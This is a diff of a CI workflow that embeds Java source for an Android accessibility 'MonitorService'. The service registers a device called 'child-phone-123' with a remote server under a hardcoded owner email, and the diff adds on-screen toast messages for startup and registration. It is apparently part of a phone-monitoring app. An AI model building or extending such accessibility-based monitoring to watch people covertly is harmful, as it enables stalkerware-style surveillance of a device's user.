@@ -201,6 +201,7 @@ jobs:
           import android.os.Looper;
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
+          import android.widget.Toast;
           import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.File;
@@ -217,14 +218,12 @@ jobs:
 
           public class MonitorService extends AccessibilityService {
 
-              // ========== CONFIG ==========
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
               private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
               private static final String DEVICE_ID = "child-phone-123";
               private static final String DEVICE_NAME = Build.MANUFACTURER + " " + Build.MODEL;
               private static final String PREFS_NAME = "device_prefs";
               private static final String TOKEN_KEY = "device_token";
-              // ============================
 
               private OkHttpClient httpClient = new OkHttpClient.Builder()
                       .connectTimeout(10, TimeUnit.SECONDS)
@@ -239,7 +238,7 @@ jobs:
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
-                  // সবসময় auto register করবে, পুরনো token উপেক্ষা করে
+                  showToast("Service started");
                   autoRegister();
               }
 
@@ -265,13 +264,15 @@ jobs:
                               JSONObject json = new JSONObject(jsonStr);
                               deviceToken = json.getString("deviceToken");
                               saveToken(deviceToken);
+                              showToast("Device registered");
                               mainHandler.post(this::startThreads);
                           } else {
-                              // ব্যর্থ হলে ১০ সেকেন্ড পর আবার চেষ্টা
+                              showToast("Register failed: " + response.code());
                               mainHandler.postDelayed(this::autoRegister, 10000);
                           }
                       } catch (Exception e) {
                           e.printStackTrace();
+                          showToast("Register error: " + e.getMessage());
                           mainHandler.postDelayed(this::autoRegister, 10000);
                       }
                   }).start();
@@ -476,6 +477,10 @@ jobs:
                   } catch (IOException e) {
                       e.printStackTrace();
                   }
+              }
+
+              private void showToast(String message) {
+                  mainHandler.post(() -> Toast.makeText(this, message, Toast.LENGTH_SHORT).show());
               }
 
               @Override
